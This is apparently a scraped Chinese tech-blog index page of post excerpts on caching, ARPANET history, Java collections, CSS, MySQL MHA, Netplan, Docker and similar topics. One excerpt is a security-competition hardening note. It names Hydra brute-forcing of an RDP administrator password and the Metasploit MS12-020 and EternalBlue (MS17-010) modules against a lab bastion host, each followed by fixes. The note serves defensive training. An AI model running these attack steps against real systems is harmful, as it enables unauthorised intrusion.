例子：在网页浏览器中，当用户访问一个网站时，浏览器会将该网页的内容存储在本地的缓存中。当下次用户再次访问同一网站或页面时，浏览器可以从缓存直接读取内容，而不是重新向服务器请求，从而大大减少了网络传输时间并提高了加载速度。
另一实例是数据库缓存。数据库系统可能会把常用查询的结果暂存到内存中的缓存区，这样后续相同的查询请求就可以快速从内存获取结果，而无需每次都执行实际的磁盘I/O操作，极大地提升了数据库查询效率。
缓冲（Buffer）：
在文件读写操作中，操作系统会在内存中开辟一块区域作为缓冲区。例如，当我们向硬盘写入文件时，数据不是立即直接写入磁盘，而是先写入内存缓冲区。当缓冲区满或者达到特定条件时，才一次性批量地将缓冲区中的数据写入硬盘。这样做的好处是可以减少频繁的I/O操作，降低对硬件的损耗，并且由于批量操作，可以更有效地利用带宽，提高数据传输速率。
在多媒体播放器中，音频和视频数据通常也是先解码后存储在缓冲区中，播放器并不是实时解码每一帧数据，而是提前预加载一定量的数据到缓冲区，确保即使网络稍有波动也能连续播放，避免卡顿现象，这就是我们常说的“缓冲”过程。
总结来说，缓存主要针对的是重复使用数据的场景，目的是减少重复计算或访问的成本；而缓冲则主要解决不同处理速度之间的暂时性存储问题，用来协调上下游的速度差异，保证数据流的平滑处理。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc424645d1f743c175b7434fb8c4573c/" rel="bookmark">
			高级分布式系统-第3讲 网络与网络互联
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		万维网的诞生 1957年10月4日， 苏联发射了人类第一颗人造卫星—斯普特尼克一号
美国政府震惊不已。 他们认为， 在日趋激烈的冷战对抗中， 自己已经全面落后于苏联。
为了扭转这一局面， 美国国防部很快于1958 年 2 月组建了一个神秘的科研部门 ——ARPA（ Advanced Research Projects Agency，高级研究计划局） 。
A R PA 信 息 处 理 技 术 办 公 室 （ I P TO ，Information Processing Techniques Office） 的第三任主管罗伯特 · 泰勒（ Robert Taylor） 认为应该建立一个兼容的协议， 允许所有终端之间互相通信。
美国国防部决定研究一种分散的指挥系统。 它由无数的节点组成， 当若干节点被摧毁后， 其它节点仍能相互通信。
1966 年， 新型通信网络项目完成内部立项， ARPA 将其命名为“ ARPANET（ 阿帕网） ” 。
1968年， 项目的第一阶段， 拉里 · 罗伯茨计划在美国西南部建立一个四节点的网络。
四个节点之间， 采用分组交换技术， 通过专门的 IMP 设备和通信线路（由 AT&amp;T 公司提供， 速率为 50kbps） 进行连接。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc424645d1f743c175b7434fb8c4573c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c15210ff940cba69ac8831a864cbc05d/" rel="bookmark">
			百科电影评论的情感分析：一种新的基于特征的启发式情感分类方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一种新的基于特征的启发式情感分类方法 1
摘要 1
介绍 1算法公式 2观察结论 4观察结论
我们的实验工作有两项重要贡献。首先，探讨了“副词+动词”与“副词+形容词”的组合在文本级情绪分类中的应用。其次，提出了一种新的基于特征的启发式电影情感分类方法。方面级别的情感分类产生了一个准确和容易理解的电影情感概况。有趣的是，方面级别的情感分析结果与电影评论的文本层面的情感分类是一致的。尽管如此，方面层面的情感概况可以为特定的电影提供更为集中和准确的情感总结，并且对用户更为有用。
我们设计的方面情感分析算法公式是一种从多个评价的不同方面获得电影完整情感轮廓的新颖独特的方法。由此产生的情绪概况信息丰富，易于理解，对用户非常有用。此外，用于方面级情绪分析的算法公式非常简单，实现速度快，生成结果快，不需要任何的培训。它可以在运行中使用，并在感兴趣的各个方面展示非常有用和详细的电影情感概况。这部分实现还可以使用内容过滤、协作过滤或混合方法作为电影推荐系统中的附加步骤。情感档案可作为设计适当电影推荐系统的额外过滤步骤。这一层面的情绪分析是一种有价值的情绪分析形式，也是随后大量用户对特定电影所表达信息的利用。这个方面算法实现的唯一限制是它是特定于域的，然而，在不同的领域中使用这种算法公式只需要很少的变化（在方面向量中）。 参考文献
[1]K. Dave, S. Lawerence &amp; D. Pennock, “Mining the Peanut Gallery-Opinion Extraction and Semantic Classification of Product Reviews”, Proceedings of the 12th International World Wide Web Conference, pp. 519-528, 2003. M. Belkin, P. Niyogi, V. Sindhwani, Manifold regularization: a geometric framework for learning from examples, Tech. rep. tr-2004-06, Dept. Comput. Sci., Univ. Chicago, Chicago, IL, Aug. 2004.
[2]P. Turney, “Thumbs up or thumbs down?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c15210ff940cba69ac8831a864cbc05d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf1c31e36a129f19c43e5c885616c824/" rel="bookmark">
			网络安全D模块（笔记详解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nmap –script=vuln //扫描靶机漏洞，当nmap扫描不能扫描时，改变思维，进行猜测漏洞
Winodws 加固 漏洞1 弱口令漏洞 （1）漏洞发现过程或思路 通过nmap扫描发现堡垒机开放了3389远程桌面端口，使用Hydra尝试对堡垒机administrator用户进行hydra暴力破解，成功爆破出密码123456,密码为弱口令，证实了堡垒机administrator用户存在弱口令。 猜测漏洞：发现密码已知， 密码属于弱口令系列， 弱密码容易被破解， 需要将密码修改成复杂密码。
（2）漏洞加固过程 将堡垒机administrator用户的密码修改为强密码p@ssw0rd,防止攻击者利用弱口令远程登录堡垒机。
（3）漏洞加固验证过程 再次对堡垒机administrator用户的密码进行hydra暴力破解,已无法爆破出密码,加固成功
漏洞2 密码策略漏洞 （1）漏洞发现过程或思路
（2）漏洞加固过程
（3）漏洞加固验证过程
漏洞3 网站服务漏洞 （1）漏洞发现过程或思路 发现漏洞
（2）漏洞加固过程 进行加固
（3）漏洞加固验证过程 加固完成
漏洞4 远程桌面漏洞 （1）漏洞发现过程或思路 通过nmap扫描发现堡垒机开放了3389远程桌面端口,且操作系统为Windows Server 2008 R2，为MS12-020漏洞影响范围,初步判断存在此漏洞。使用msf载入MS12-020的auxiliary/scanner/rdp/ms12_020_check检测模块对堡垒机进行检测,证实堡垒机存在此漏洞。
猜测漏洞： 发现漏洞
（2）漏洞加固过程 计算机右键属性-&gt;远程设置-&gt;远程选项，禁用远程桌面,防止攻击者利用此漏洞攻击堡垒机导致堡垒机蓝屏宕机。
（3）漏洞加固验证过程 再次使用msf渗透测试平台对堡垒机进行检测,漏洞已无法被利用，加固成功。
漏洞5 后门漏洞 （1）漏洞发现过程或思路 发现漏洞
（2）漏洞加固过程 进行加固
（3）漏洞加固验证过程 加固完成
漏洞6 服务溢出漏洞 （1）漏洞发现过程或思路 通过nmap扫描发现堡垒机445端口开放了smb服务,且堡垒机操作系统为Windows Server 2008 R2，为MS17-010漏洞影响范围,初步判断堡垒机存在此漏洞。使用msf载入MS17-010的exploit/windows/smb/ms17_010_eternalblue攻击模块对堡垒机进行检测,证实了堡垒机存在此漏洞。
（2）漏洞加固过程 打开服务-&gt;找到Server-&gt;关闭Server服务,以防止攻击者利用此漏洞以夺取服务器权限。
或者
（3）漏洞加固验证过程 再次使用msf渗透载入MS17-010的exploit/windows/smb/ms17_010_eternalblue攻击模块对堡垒机进行检测，漏洞已无法被利用,加固成功。
漏洞7 后门用户漏洞 （1）漏洞发现过程或思路 通过cmd 命令net user查看所有用户,发现后门用户hacker，证实了服务器存在后门用户，存在安全风险。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf1c31e36a129f19c43e5c885616c824/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/633b01664e969d7ea1fadf5530c94449/" rel="bookmark">
			Java集合框架面试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.说说有哪些常见集合？ 集合相关类和接口都在java.util中，主要分为3种：List（列表）、Map（映射）、Set(集)。
其中Collection是集合List、Set的父接口，它主要有两个子接口：
List：存储的元素有序，可重复。Set：存储的元素不无序，不可重复。 Map是另外的接口，是键值对映射结构的集合。
2.ArrayList和LinkedList有什么区别？ **（1）**数据结构不同
ArrayList基于数组实现LinkedList基于双向链表实现 （2） 多数情况下，ArrayList更利于查找，LinkedList更利于增删
ArrayList基于数组实现，get(int index)可以直接通过数组下标获取，时间复杂度是O(1)；LinkedList基于链表实现，get(int index)需要遍历链表，时间复杂度是O(n)；当然，get(E element)这种查找，两种集合都需要遍历，时间复杂度都是O(n)。ArrayList增删如果是数组末尾的位置，直接插入或者删除就可以了，但是如果插入中间的位置，就需要把插入位置后的元素都向前或者向后移动，甚至还有可能触发扩容；双向链表的插入和删除只需要改变前驱节点、后继节点和插入节点的指向就行了，不需要移动元素。 注意，这个地方可能会出陷阱，LinkedList更利于增删更多是体现在平均步长上，不是体现在时间复杂度上，二者增删的时间复杂度都是O(n)
**（3）**是否支持随机访问
ArrayList基于数组，所以它可以根据下标查找，支持随机访问，当然，它也实现了RandmoAccess 接口，这个接口只是用来标识是否支持随机访问。LinkedList基于链表，所以它没法根据序号直接获取元素，它没有实现RandmoAccess 接口，标记不支持随机访问。 **（4）**内存占用，ArrayList基于数组，是一块连续的内存空间，LinkedList基于链表，内存空间不连续，它们在空间占用上都有一些额外的消耗：
ArrayList是预先定义好的数组，可能会有空的内存空间，存在一定空间浪费LinkedList每个节点，需要存储前驱和后继，所以每个节点会占用更多的空间 4.ArrayList怎么序列化的知道吗？ 为什么用transient修饰数组？ ArrayList的序列化不太一样，它使用transient修饰存储元素的elementData的数组，transient关键字的作用是让被修饰的成员属性不被序列化。
为什么最ArrayList不直接序列化元素数组呢？
出于效率的考虑，数组可能长度100，但实际只用了50，剩下的50不用其实不用序列化，这样可以提高序列化和反序列化的效率，还可以节省内存空间。
那ArrayList怎么序列化呢？
ArrayList通过两个方法readObject、writeObject自定义序列化和反序列化策略，实际直接使用两个流ObjectOutputStream和ObjectInputStream来进行序列化和反序列化。
5.快速失败(fail-fast)和安全失败(fail-safe)了解吗？ 快速失败（fail—fast）：快速失败是Java集合的一种错误检测机制
在用迭代器遍历一个集合对象时，如果线程A遍历过程中，线程B对集合对象的内容进行了修改（增加、删除、修改），则会抛出Concurrent Modification Exception。原理：迭代器在遍历时直接访问集合中的内容，并且在遍历过程中使用一个 modCount 变量。集合在被遍历期间如果内容发生变化，就会改变modCount的值。每当迭代器使用hashNext()/next()遍历下一个元素之前，都会检测modCount变量是否为expectedmodCount值，是的话就返回遍历；否则抛出异常，终止遍历。注意：这里异常的抛出条件是检测到 modCount！=expectedmodCount 这个条件。如果集合发生变化时修改modCount值刚好又设置为了expectedmodCount值，则异常不会抛出。因此，不能依赖于这个异常是否抛出而进行并发操作的编程，这个异常只建议用于检测并发修改的bug。场景：java.util包下的集合类都是快速失败的，不能在多线程下发生并发修改（迭代过程中被修改），比如ArrayList 类。 安全失败（fail—safe）
采用安全失败机制的集合容器，在遍历时不是直接在集合内容上访问的，而是先复制原有集合内容，在拷贝的集合上进行遍历。原理：由于迭代时是对原集合的拷贝进行遍历，所以在遍历过程中对原集合所作的修改并不能被迭代器检测到，所以不会触发Concurrent Modification Exception。缺点：基于拷贝内容的优点是避免了Concurrent Modification Exception，但同样地，迭代器并不能访问到修改后的内容，即：迭代器遍历的是开始遍历那一刻拿到的集合拷贝，在遍历期间原集合发生的修改迭代器是不知道的。场景：java.util.concurrent包下的容器都是安全失败，可以在多线程下并发使用，并发修改，比如CopyOnWriteArrayList类。 6.有哪几种实现ArrayList线程安全的方法？ fail-fast是一种可能触发的机制，实际上，ArrayList的线程安全仍然没有保证，一般，保证ArrayList的线程安全可以通过这些方案：
使用 Vector 代替 ArrayList。（不推荐，Vector是一个历史遗留类）使用 Collections.synchronizedList 包装 ArrayList，然后操作包装后的 list。使用 CopyOnWriteArrayList 代替 ArrayList。在使用 ArrayList 时，应用程序通过同步机制去控制 ArrayList 的读写。 7.CopyOnWriteArrayList了解多少？ CopyOnWriteArrayList就是线程安全版本的ArrayList。
它的名字叫CopyOnWrite——写时复制，已经明示了它的原理。
CopyOnWriteArrayList采用了一种读写分离的并发策略。CopyOnWriteArrayList容器允许并发读，读操作是无锁的，性能较高。至于写操作，比如向容器中添加一个元素，则首先将当前容器复制一份，然后在新副本上执行写操作，结束之后再将原容器的引用指向新容器。
8.能说一下HashMap的数据结构吗？ JDK1.7的数据结构是数组+链表，JDK1.7还有人在用？不会吧……
说一下JDK1.8的数据结构吧：
JDK1.8的数据结构是数组+链表+红黑树。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/633b01664e969d7ea1fadf5530c94449/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dea554ebca8594d8a2c0be561e94ab28/" rel="bookmark">
			css的一些属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 我们在写项目的时候，会遇到多种多样的样式，大部分都是由css来实现的，css可以让我们的页面更美观，css通常是配合HTML使用，代码较为简单!
下面我就给大家举几个较为常用的一些css属性。
1.CSS中怎样让元素圆角化？
border-radius: 50px; //50px是单位 这是让元素整体圆角化
我们也可以设置指定角来圆角化；
border-top-left-radius: 50px; //让元素左上角圆角化 border-top-right-radius: 50px; //让元素右上角圆角化 border-bottom-left-radius: 50px; //让元素左下角圆角化 border-bottom-right-radius: 50px; //让元素右下角圆角化 这是让元素的指定角实现圆角化，很好理解。
2.CSS中怎样实现阴影 shadow
div { box-shadow: 10px 10px 5px #888888; } 我们可以使用box-shadow属性进行设置，我们也可以设置自己喜欢的阴影颜色，以及照射方向，阴影深浅！
上面是一个效果图，大家可以参考一下。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37a760cac01209f09a16cc3ac918a5fd/" rel="bookmark">
			英文诗歌里是如何表达“我命由我不由天”这句话的？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		“我命由我不由天”是动画电影《哪吒之魔童降世》里的主旨也是其中很有代表性的一句台词。网上很多人脑洞大开试图找出一句经典的英文翻译。引用英国诗人威廉·欧内斯特·亨利的名篇《Invictus》中最后的两句，我个人认为是一种相当“信、达、雅”的翻译：
而且，《Invictus》（拉丁语意为“不可征服）这首诗在欧美国家流传度极高。南非前总统纳尔逊·曼德拉就非常喜欢这一首短诗，据说他被囚禁于罗本岛时，就经常背诵这首诗，以达到激励斗志、坚定信仰的目的。在拍摄曼德拉的传记电影《成事在人》时，导演克林特·伊斯特伍德决定将《成事在人》的片名由原来的工作用名“The Human Factor”改为了“Invictus”，将诗歌与电影合为一体，体现了“面对灾难时争取生存”的主题。
威廉·欧内斯特·亨利（William Ernest Henley，1849年8月23日-1903年7月11日），19世纪的英国诗人诗人、文学评论家和编辑，他于1875年写就的诗歌《Invictus》为其代表作：
Out of the night that covers me,
Black as the pit from pole to pole, I thank whatever gods may be
For my unconquerable soul. In the fell clutch of circumstance
I have not winced nor cried aloud. Under the bludgeonings of chance
My head is bloody, but unbowed. Beyond this place of wrath and tears
Looms but the Horror of the shade, And yet the menace of the years
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37a760cac01209f09a16cc3ac918a5fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e61216b9100ff74c0e041813f9848f8/" rel="bookmark">
			数据库高可用mha
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MHA搭建的步骤 一.配置主从复制 1.初始化环境 #在四台服务器上初始化环境 systemctl stop firewalld systemctl disable firewalld setenforce 0 2.修改 Master、Slave1、Slave2 节点的主机名 #在Master上 hostnamectl set-hostname mysql1 su #在Slave1 hostnamectl set-hostname mysql2 su #在Slave2 hostnamectl set-hostname mysql3 su 3.在Master、Slave1、Slave2添加域名解析 vim /etc/hosts 172.16.23.13 mysql1 172.16.23.15 mysql2 172.16.23.16 mysql3 4.配置主从同步 #修改 Master、Slave1、Slave2 节点的 Mysql主配置文件/etc/my.cnf ##Master 节点## vim /etc/my.cnf [mysqld] server-id = 1 log_bin = mysql-bin binlog_format = mixed log-slave-updates = true relay-log = relay-log-bin relay-log-index = slave-relay-bin.index systemctl restart mysqld ##Slave1 节点## vim /etc/my.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e61216b9100ff74c0e041813f9848f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60118c6569ac3f065a2feaf7fd394d95/" rel="bookmark">
			leetcode：908. 最小差值 I
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、题目
二、函数原型
int smallestRangeI(int* nums, int numsSize, int k) 三、思路
本题题目有些绕口，但是无伤大雅。本质就是可以对数组中的每个元素进行加/减 k 的操作，然后求数组中的最大、最小元素的最小差值。
分为几种情况：
1.原数组中最大值和最小值的差值一半 小于等于 k，说明最大、最小元素可以通过加/减 k 的操作后相等，那么最大、最小元素的最小差值就是0
2.原数组中最大值和最小值的差值一半 大于 k，明最大、最小元素不可以通过加/减 k 的操作相等，那么最大、最小元素的最小差值就是 max - k - (min + k)
四、代码
int cmp(const void* e1,const void* e2) { return *(int*)e1-*(int*)e2; } int smallestRangeI(int* nums, int numsSize, int k) { qsort(nums,numsSize,sizeof(int),cmp);//排序找到最大最小元素 int min=nums[0];//最小元素 int max=nums[numsSize-1];//最大元素 if((float)(max-min)/2&lt;=(float)k) { return 0; } else { return max-k-min-k; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9201e79f7b49aef1ba8b3070be320e1c/" rel="bookmark">
			Netplan介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 介绍 1.1 简介 Netplan是一个抽象网络配置描述器。通过netplan命令，你只需用一个 YAML文件描述每个网络接口所需配置。netplan并不关系底层管理工具是NetworkManager还是networkd。
它是一个在 Linux 系统上进行网络配置的实用程序。您创建所需接口的描述并定义每个接口应该做什么。
Netplan 满足在 YAML 中跨一组多功能服务器、桌面、云或物联网安装进行简单、描述性网络配置的需求。
对于想要使用通用网络配置来控制不同后端（例如 NetworkManager 或 systemd-networkd）的 Linux 系统管理员来说，它非常有用。
Netplan 是 Ubuntu 家族的成员。这是一个开源项目。
Ubuntu 18.04开始，Ubuntu和Debian移除了以前的ifup/ifdown命令和/etc/network/interfaces配置文件，转而使用ip link set或者/etc/netplan/01-netcfg.yaml模板和sudo netplan apply命令实现网络管理。
ip link set为iproute2工具集命令，多用于临时配置，取代ifup和ifdown。
如果安装的是服务器版本，则默认使用networkd进行管理，并且不会安装NetworkManager和提供nmcli接口。
如果安装的是桌面版本，则默认使用NetworkManager进行管理。
Netplan 目前支持的网络管理工具:
NetworkManagerSystemd-networkd 1.2 Netplan、NetworkManager、Systemd-networkd 关系 Netplan 支持调用 NetworkManager 和 Systemd-networkd；
NetworkManager和systemd-networked可以理解为相互替代关系。
如果要禁用NetworkManager，则应启用systemd-networkd，而在systemd-networkd运行时最好禁用networkmanager。
1.3 命令 netplan 操作命令提供两个子命令：
netplan generate ：生成后端管理工具对应的配置；（/etc/netplan）netplan apply ：应用配置(以便生效)，必要时重启管理工具；netplan try ：在配置得到确认之后才应用，如果配置存在错误，则回滚，类似test；netplan get：获取当前netplan配置；netplan set：修改当前netplan配置。netplan --debug apply 返回错误信息。 辅助命令 networkctl 可以查看网络设备的汇总信息
networkctl status 可以查看详情状态。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9201e79f7b49aef1ba8b3070be320e1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed2de3ea4d358219fc7c5c740de46f2a/" rel="bookmark">
			Protobuf 安装与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Protobuf 安装与使用 1 环境2 安装 [apt安装]2 安装 [源码安装]1 依赖2 下载 protobuf3 解压4 编译安装5 配置环境 2 命令查看版本卸载 3 使用书写 .proto 文件编译 .proto 文件生成 cpp 文件编写 cpp 文件编译运行 参考 1 环境 ubuntn 20.04
protobuf v3.6.1
2 安装 [apt安装] 2 安装 [源码安装] 1 依赖 需要git、g++、cmake 等
sudo apt-get update sudo apt-get install autoconf automake libtool 2 下载 protobuf 选择版本 v3.6.1
网址：https://github.com/protocolbuffers/protobuf/releases/tag/v3.6.1
选择：protobuf-all-3.6.1.tar.gz
3 解压 拷贝到自己目录下解压
sudo tar -zxvf protobuf-all-3.6.1.tar.gz 4 编译安装 cd protobuf-3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed2de3ea4d358219fc7c5c740de46f2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5084cf66c20736b1aedbbe130ba37273/" rel="bookmark">
			C/C&#43;&#43;汇编学习（四）——编写不同的C&#43;&#43;程序并分析其汇编输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们可以从一个简单的C++代码示例开始，然后生成其对应的汇编代码并进行解析。这个过程不仅展示了C++代码如何被转换成汇编语言，而且还帮助理解编译器是如何处理代码的。
目录
案例一 基础
C++ 代码示例
生成汇编代码
汇编代码解析
注释解析 C语言版的汇编
G++与GCC区别
总结
案例二 类
总结 案例三 虚函数和继承
伪代码解析
1. 虚函数表（VTable）
2. 对象构造和虚函数表指针
3. 调用虚函数
4. 多态的实现
总结
实际汇编
案例四 模板类
发现的问题解析
1. 编译器的自动实例化
2. 显式实例化
3. 代码膨胀问题
4. 编译时间增加
5. 类型特征和条件编译
6. 模板元编程
实际汇编
关键点解析 1. std::char_traits 的 length 方法
2. Container 的析构函数
3. 主函数 main
4. Container 类的 show 方法 5. 模板函数 printTwice
6. Container 的构造
解析
总结
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5084cf66c20736b1aedbbe130ba37273/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92f313ed49787b9b551ef6f2945f769e/" rel="bookmark">
			推荐几个将pdf论文翻译转化为中文论文的免费在线网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果你需要将英文PDF研究论文翻译成中文，有几个网站可以帮助你：
Online Doc Translator【传送门】 这项免费服务允许您上传 PDF 并将其翻译成中文。它支持包括PDF在内的多种文档格式，并保持文档的原始布局。
GroupDocs【传送门】 这个在线工具提供免费的PDF文档从英文到中文的翻译。它是一个基于浏览器的应用程序，因此不需要安装软件。请注意，PDF 文档的字符限制为 10,000 个字符。
DocTranslator【传送门】 该网站为最大 1Gb 和长达 5,000 页的 PDF 文档提供高质量的翻译服务。它可以对图像进行 OCR 并翻译它们，同时保留原始格式和布局。
SwifDoo PDF【传送门】 该工具提供了将选定文本或整个文档从英文翻译成中文的选项，它还支持使用 OCR 技术进行扫描的 PDF 翻译。它适用于标准和扫描的 PDF。
Smallpdf【传送门】 该平台使用谷歌翻译提供免费的 PDF 文件翻译。它还提供额外的 PDF 管理工具，如格式转换、文件压缩和电子签名。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02127d5baa60b26e0aa1ee578dfe2cf7/" rel="bookmark">
			二 数据查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、实验目的
理解SQL成熟设计基本规范，熟练运用SQL语言实现数据基本查询，包括但表查询、分组统计查询和连接查询。
2、实验内容及要求
针对数据库设计各种单表查询SQL语句、分组统计查询语句；设计单个表针对自身的连接查询，设计多个表的连接查询。理解和掌握SQL查询语句的特点和作用，按照SQL程序设计规范写出具体的SQL查询语句，并调试通过。
3、实验步骤
利用课本上的Student、Course和SC表。用SQL语句完成下面的操作，并调试通过。(需要首先创建表,再在表里插入一些相应的数据)
①查询学生选课表中的全部数据。
select * from sc;
②查询计算机系的学生的姓名、年龄。
SELECT Sname, Sage FROM Student WHERE Sdept = 'CS'
③查询成绩在70~80分之间的学生的学号
SELECT sno, cno, grade FROM sc where grade between 70 and 80
④查询计算机系年龄在18~20之间且性别为“男”的学生的姓名、年龄。
SELECT sname,Sage from student where Sage between 18 and 20 and Ssex='男';
⑤查询课程号为“c001”的课程的最高的分数。
SELECT TOP 1 grade from SC WHERE cno='c001';
⑥查询计算机系学生的最大年龄和最小年龄。
SELECT MAX(Sage) '最大年龄', MIN(Sage) '最小年龄' from STUDENT
4、实验小结
通过本次实验，我充分实践数据库的各种单表查询SQL语句、分组统计查询语句；以及自身的连接查询，多表连接查询。熟练掌握SQL查询语句的特点和作用，按照SQL程序设计规范，创建STUDENT,COURSE,SC三个表，并且自己插入相关的测试数据。完全地根据需求通过SQL查询出对应结果，同时通过dbug和查询资料解决了一些棘手的问题。本次实验让我在平时感到模糊的知识又复习了一遍，并且亲手实践，按照不同的需求，修改不同的数据来测试结果。数据库是现代信息技术中必不可少的一环，本次实验通过创建数据表和修改数据表的操作，让我了解到了数据库的原理和应用，进一步提高了我的实际操作能力。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c51bf368ea36cb702325257ace1be010/" rel="bookmark">
			静态路由协议的配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验题目 静态路由协议的配置
实验目的 熟悉路由器工作原理和机制；巩固静态路由理论；设计简单网络结构；规划 IP 地址、子网掩码和网关。 实验任务 设计网络拓扑结构；正确规划 IP 地址、子网掩码和网关；掌握静态路由配置指令；掌握如何分析路由表。 实验设备 1．所用设备： PC 机
2．消耗性器材：无
实验环境 本实验为设计型实验，每组1人。
实验步骤 静态路由的配置
建立如上所示的拓扑结构，现在需要完成的就是让PC1能和PC3互相 ping 通。
具体配置如下：
Router0 的配置：
1.配置接口 fastEthernet 0/0 2.配置接口 serial 2/0 R1 (config)#interface serial 2/0
R1 (config-if)#ip address 11.0.0.1 255.0.0.0
R1(config-if)#clock rate 64000 //clock rate 是dce 设备给dte 设备提供时钟频率的，需要在 dce 里面设置，而另外的一个路由器里面则不用设置
R1 (config-if)#no shutdown
R1 (config-if)#exit
Router1 的配置： 1.配置接口 serial 3/0 2.配置接口 fastEthernet 0/0 设置静态路由 1.配置路由器 R1 R1# configure terminal
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c51bf368ea36cb702325257ace1be010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6467e08cf70a75990806e6faf5facfff/" rel="bookmark">
			微信小程序的5种打开页面方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 wx.navigateTo：打开新页面
使用 wx.navigateTo 可以打开一个新的页面，新页面会被放置在当前页面的上层。 wx.navigateTo({ url: '/pages/nextPage/nextPage' }); wx.redirectTo：关闭当前页面，打开新页面
使用 wx.redirectTo 关闭当前页面，并打开一个新页面。适用于不需要保留当前页面状态的情况。 wx.redirectTo({ url: '/pages/otherPage/otherPage' }); wx.switchTab：跳转到 tabBar 页面
使用 wx.switchTab 可以跳转到 tabBar 页面，注意目标页面需要在 app.json 中有对应的 tabBar 配置。 wx.switchTab({ url: '/pages/tabBarPage/tabBarPage' }); wx.reLaunch：关闭所有页面，打开新页面
使用 wx.reLaunch 关闭所有页面，并打开一个新页面。适用于需要重新加载整个小程序的情况。 wx.reLaunch({ url: '/pages/homePage/homePage' }); wx.navigateBack：返回上一页
使用 wx.navigateBack 可以返回到上一页，可以指定返回的层数。 wx.navigateBack({ delta: 1 // 返回上一页，可以根据实际情况设置 delta 的值 }); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/251bbe65cc0ef11d938e0c40e84cb670/" rel="bookmark">
			Docker overlay2文件busy，容器不能删除问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 在删除docker容器的时候报错,说设备正忙通过 docker ps -a 查看有两个状态的dead的容器解决方法：1.查看所有挂载的设备2.截取设备的进程id3.清理进程(kill掉即可) 在删除docker容器的时候报错,说设备正忙 Error response from daemon: Driver overlay2 failed to remove root filesystem 21852249cce97a1ad5b631ca9f52c81b862d741591e0d337011a28d31992b64f: remove /var/lib/docker/overlay2/1a2b773cc1c55a606b23952dfd2695e49c5924061cb0744fee3e56694bad211e/merged: device or resource busy
通过 docker ps -a 查看有两个状态的dead的容器 解决方法： 1.查看所有挂载的设备 grep docker /proc/*/mountinfo 2.截取设备的进程id grep docker /proc/*/mountinfo | grep 1a2b773cc1c55a606b23952dfd2695e49c5924061cb0744fee3e56694bad211e | awk -F':' '{print $1}' | awk -F'/' '{print $3}' 3.清理进程(kill掉即可) kill -9 $(grep docker /proc/*/mountinfo | grep 1a2b773cc1c55a606b23952dfd2695e49c5924061cb0744fee3e56694bad211e | awk -F':' '{print $1}' | awk -F'/' '{print $3}') 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fc49eae9fba7a5d97249a4e9d57d899/" rel="bookmark">
			UE5.1_UMG序列帧动画制作
			</a>
		</h2>
		
	</header>
